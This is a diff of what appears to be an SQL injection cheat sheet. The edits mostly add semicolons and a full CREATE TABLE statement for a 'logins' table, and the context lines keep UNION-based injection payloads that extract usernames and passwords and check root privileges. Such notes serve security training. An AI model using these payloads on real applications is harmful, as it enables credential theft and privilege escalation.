@@ -512,17 +512,17 @@ $ mysql -u <username> -h <hostname> -P 3306 -p
 - SQL General Commands
 
 ```
-SHOW DATABASES
-USE users
-SHOW GRANTS
+SHOW DATABASES;
+USE users;
 ```
 
 - SQL Table Commands
 
 ```
-CREATE TABLE logins (id INT, ...)
-SHOW TABLES
-DESCRIBE logins
+SHOW TABLES;
+CREATE TABLE logins (id INT, username VARCHAR(100), password VARCHAR(100), date_of_joining DATETIME);
+CREATE TABLE logins (id INT NOT NULL AUTO_INCREMENT, username VARCHAR(100) UNIQUE NOT NULL, password VARCHAR(100) NOT NULL, date_of_joining DATETIME DEFAULT NOW(), PRIMARY KEY (id));
+DESCRIBE logins;
 INSERT INTO table_name VALUES (value_1,..)
 INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)
 UPDATE table_name SET column1=newvalue1, ... WHERE <condition>
@@ -584,6 +584,7 @@ cn' UNION select 1, username, password, 4 from dev.credentials-- -
 - SQL Privilege Checks
 
 ```
+SHOW GRANTS;
 cn' UNION SELECT 1, user(), 3, 4-- -
 cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
 cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
